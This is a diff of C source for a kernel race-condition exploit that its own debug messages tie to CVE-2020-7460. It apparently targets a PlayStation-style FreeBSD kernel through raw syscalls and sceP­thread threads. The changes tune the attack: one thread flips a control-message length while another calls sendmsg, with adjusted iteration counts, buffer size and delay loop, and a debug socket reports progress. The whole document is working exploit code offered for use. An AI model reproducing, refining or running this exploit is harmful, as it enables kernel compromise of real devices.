@@ -23,8 +23,9 @@ struct cmsghdr {
     int           cmsg_type;
 };
 
-#define ITERATIONS 2000000
-#define CONTROL_LEN 512
+#define IP_RETOPTS 7
+#define ITERATIONS 1000000
+#define CONTROL_LEN 256
 #define DEBUG_IP "192.168.100.16"
 #define DEBUG_PORT 9023
 
@@ -33,7 +34,7 @@ uint8_t control_buf[CONTROL_LEN];
 int global_sock;
 int debug_sock;
 
-void print_debug(const char *msg) {
+void debug_print(const char *msg) {
     if (debug_sock > 0 && msg) {
         SckSend(debug_sock, (char *)msg, strlen(msg));
     }
@@ -64,9 +65,12 @@ void *race_thread(void *arg) {
     _CPU_SET(1, &cpuset);
     syscall(597, scePthreadSelf(), sizeof(cpuset), &cpuset);
 
+    if (!cmsg) return NULL;
+
     for (int i = 0; i < ITERATIONS; i++) {
         cmsg->cmsg_len = 0x50;
-        for(volatile int dump=0; dump<10; dump++);
+        // حلقة التأخير لضبط توقيت السباق لمنع خطأ copyin المباشر
+        for(volatile int delay = 0; delay < 25; delay++); 
         cmsg->cmsg_len = 0xFFFF;
     }
     return NULL;
@@ -80,30 +84,30 @@ int _main(struct thread *td) {
     initPthread();
 
     debug_sock = SckConnect(DEBUG_IP, DEBUG_PORT);
-    
-    print_debug("[+] CVE-2020-7460 Race Started\n");
+    debug_print("[+] Connected! Starting Targeted Race...\n");
 
     global_sock = syscall(97, 2, 2, 0);
     if (global_sock < 0) {
-        print_debug("[-] Socket Error\n");
-    } else {
-        print_debug("[+] Global Sock opened successfully\n");
+        debug_print("[-] Socket failed\n");
+        return -1;
     }
 
     memset(control_buf, 0, CONTROL_LEN);
     cmsg = (struct cmsghdr *)control_buf;
     cmsg->cmsg_level = 0;
-    cmsg->cmsg_type = 7; 
+    cmsg->cmsg_type = IP_RETOPTS;
     cmsg->cmsg_len = 0x50;
 
+    debug_print("[+] Starting Threads...\n");
+
     ScePthread thread1, thread2;
-    scePthreadCreate(&thread1, NULL, sendmsg_thread, NULL, "thr1");
-    scePthreadCreate(&thread2, NULL, race_thread, NULL, "thr2");
+    scePthreadCreate(&thread1, NULL, sendmsg_thread, NULL, "thr_sendmsg");
+    scePthreadCreate(&thread2, NULL, race_thread, NULL, "thr_race");
 
     scePthreadJoin(thread1, NULL);
     scePthreadJoin(thread2, NULL);
 
-    print_debug("[+] Race Finished\n");
+    debug_print("[+] Race Completed. If no Panic, adjust delay.\n");
 
     if (debug_sock > 0) SckClose(debug_sock);
     return 0;
